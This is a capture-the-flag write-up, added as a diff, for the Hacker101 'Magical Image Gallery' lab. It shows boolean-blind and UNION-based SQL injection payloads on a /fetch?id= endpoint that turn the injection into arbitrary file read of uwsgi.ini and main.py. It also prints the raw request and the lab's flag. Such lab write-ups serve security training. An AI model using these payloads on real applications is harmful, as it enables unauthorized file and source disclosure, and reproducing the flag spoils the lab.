@@ -1,0 +1,68 @@
+================================
+LAB: Magical Image Gallery - Flag #1
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: February 6, 2026
+Lab URL: https://618a0a757b7277affb45517a31c06a98.ctf.hacker101.com/
+Category: Web Security - SQL Injection
+Level: Moderate
+Objective: Extract flag from application source code
+Description: Image gallery application with SQLi vulnerability leading to file disclosure
+
+[RECONNAISSANCE]
+----------------
+Site displays 3 cat images fetched via /fetch?id=1,2,3 endpoint.
+Testing revealed id=3 returns 500 ISE despite being referenced in UI.
+
+Basic SQLi tests:
+- /fetch?id=1' → 500 (injection confirmed)
+- /fetch?id=1 AND 1=1-- → 200 (boolean true)
+- /fetch?id=1 AND 1=2-- → 404 (boolean false)
+
+Confirmed MySQL 10.x via version extraction.
+Database structure: 2 tables (albums, photos).
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+Boolean-based blind SQLi on id parameter allows information disclosure.
+Testing UNION injection revealed file read capability:
+
+/fetch?id=-1 UNION SELECT 'test' → 500 (app tries to read file 'test')
+
+Backend logic: SELECT filename FROM photos WHERE id=X, then reads file.
+This converts SQLi into arbitrary file read vulnerability.
+
+[EXPLOITATION]
+--------------
+Step 1: Read application config
+Payload: /fetch?id=4 UNION SELECT 'uwsgi.ini'
+Result: Disclosed main module name (main.py)
+
+Step 2: Extract source code
+Payload: /fetch?id=4 UNION SELECT '../main.py'
+Result: Complete Flask application source (1832 bytes)
+
+Step 3: Flag extraction
+Source code contained flag in comment at line 54:
+# ^FLAG^eb7eed909befdc859f512b8f075e254a2629a6d58d577845e89c434a63b8c0cc$FLAG$
+
+[EVIDENCE]
+----------
+Request:
+GET /fetch?id=4%20UNION%20SELECT%20%27../main.py%27 HTTP/2
+
+Response snippet (line 54):
+# It's dangerous to go alone, take this:
+# ^FLAG^eb7eed909befdc859f512b8f075e254a2629a6d58d577845e89c434a63b8c0cc$FLAG$
+
+Flag: eb7eed909befdc859f512b8f075e254a2629a6d58d577845e89c434a63b8c0cc
+
+[LESSONS LEARNED]
+-----------------
+1. SQLi combined with file read operations creates critical vulnerability
+2. UNION injection allows reading arbitrary files when app processes SQL results as file paths
+3. Configuration files (uwsgi.ini) often reveal source code locations
+4. Developers sometimes leave flags/credentials in source comments
+5. Proper prepared statements would prevent SQLi, file operations should validate paths
